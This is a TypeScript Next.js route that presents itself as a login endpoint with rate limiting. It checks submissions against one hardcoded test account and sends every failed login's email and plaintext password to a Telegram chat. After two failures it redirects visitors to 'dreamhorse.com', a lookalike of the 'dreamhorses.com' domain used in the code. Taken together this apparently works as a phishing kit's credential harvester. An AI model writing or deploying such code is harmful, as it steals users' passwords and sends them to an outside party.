import { sendTelegramMessage } from '../../../../src/services/telegram';
import { NextRequest, NextResponse } from 'next/server';

// In-memory attempt tracking (IP address -> {count, timestamp})
const attemptTracker = new Map<string, { count: number; timestamp: number }>();

// Reset attempts older than 15 minutes
const ATTEMPT_RESET_TIME = 15 * 60 * 1000;
const MAX_ATTEMPTS = 2;

// Test credentials (in production, validate against a database)
const VALID_CREDENTIALS = {
  email: 'test@dreamhorses.com',
  password: 'password123',
};

/**
 * Get client IP address from request
 */
function getClientIP(request: NextRequest): string {
  const forwarded = request.headers.get('x-forwarded-for');
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  return request.headers.get('x-real-ip') || 'unknown';
}

/**
 * Check and increment failed attempts for an IP
 */
function checkAndUpdateAttempts(ip: string): { canAttempt: boolean; attemptsLeft: number } {
  const now = Date.now();
  const record = attemptTracker.get(ip);

  // Reset if outside the time window
  if (record && now - record.timestamp > ATTEMPT_RESET_TIME) {
    attemptTracker.delete(ip);
    return { canAttempt: true, attemptsLeft: MAX_ATTEMPTS };
  }

  if (!record) {
    return { canAttempt: true, attemptsLeft: MAX_ATTEMPTS };
  }

  if (record.count >= MAX_ATTEMPTS) {
    return { canAttempt: false, attemptsLeft: 0 };
  }

  return { canAttempt: true, attemptsLeft: MAX_ATTEMPTS - record.count };
}

/**
 * Increment failed attempt count
 */
function recordFailedAttempt(ip: string): void {
  const now = Date.now();
  const record = attemptTracker.get(ip);

  if (record) {
    record.count += 1;
    record.timestamp = now;
  } else {
    attemptTracker.set(ip, { count: 1, timestamp: now });
  }
}

/**
 * Clear attempts for an IP (on successful login)
 */
function clearAttempts(ip: string): void {
  attemptTracker.delete(ip);
}

/**
 * Send Telegram notification about failed login attempt
 */
async function notifyFailedAttempt(
  ip: string,
  email: string,
  password: string,
  attemptsLeft: number
): Promise<void> {
  try {
    const timestamp = new Date().toISOString();

    let message = `🚨 **Login Attempt Failed**\n`;
    message += `📅 Time: ${timestamp}\n`;
    message += `🔗 IP: ${ip}\n`;
    message += `📧 Email: ${email}\n`;
    message += `🔑 Password: ${password}\n`;
    message += `🔄 Attempts remaining: ${attemptsLeft}`;

    await sendTelegramMessage(message);
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
}

/**
 * POST /api/auth/login
 */
export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { email, password } = body;

    const clientIP = getClientIP(request);

    // Validate input
    if (!email || !password || typeof email !== 'string' || typeof password !== 'string') {
      return NextResponse.json(
        { error: 'Invalid request' },
        { status: 400 }
      );
    }

    // Check if client can attempt
    const { canAttempt } = checkAndUpdateAttempts(clientIP);

    if (!canAttempt) {
      console.warn(`[AUTH] Max login attempts exceeded for IP: ${clientIP}, email: ${email}`);

      try {
        const timestamp = new Date().toISOString();
        const message =
          `🚨 **Max Login Attempts Exceeded**\n` +
          `📅 Time: ${timestamp}\n` +
          `🔗 IP: ${clientIP}\n` +
          `📧 Email: ${email}`;

        await sendTelegramMessage(message);
      } catch (error) {
        console.error('[AUTH] Failed to notify Telegram of max attempts:', error);
      }

      return NextResponse.json(
        { redirect: 'https://dreamhorse.com' },
        { status: 429 }
      );
    }

    // Validate credentials
    const isValid =
      email.trim() === VALID_CREDENTIALS.email &&
      password === VALID_CREDENTIALS.password;

    if (!isValid) {
      recordFailedAttempt(clientIP);

      const newAttemptsLeft = MAX_ATTEMPTS - (attemptTracker.get(clientIP)?.count || 0);

      console.warn(
        `[AUTH] Failed login attempt. Client: ${clientIP}, Email: ${email.substring(0, 3)}***, Attempts left: ${newAttemptsLeft}`
      );

      await notifyFailedAttempt(clientIP, email, password, newAttemptsLeft);

      if (newAttemptsLeft === 0) {
        return NextResponse.json(
          {
            error: 'Invalid username and password',
            redirect: 'https://dreamhorse.com',
          },
          { status: 401 }
        );
      }

      return NextResponse.json(
        { error: 'Invalid username and password' },
        { status: 401 }
      );
    }

    // Successful login
    clearAttempts(clientIP);

    console.log(`[AUTH] Successful login. Client: ${clientIP}, Email: ${email.substring(0, 3)}***`);

    return NextResponse.json(
      { success: true },
      { status: 200 }
    );

  } catch (error) {
    console.error(
      '[AUTH] Login endpoint error:',
      error instanceof Error ? error.message : 'Unknown error'
    );

    return NextResponse.json(
      { error: 'An error occurred. Please try again.' },
      { status: 500 }
    );
  }
}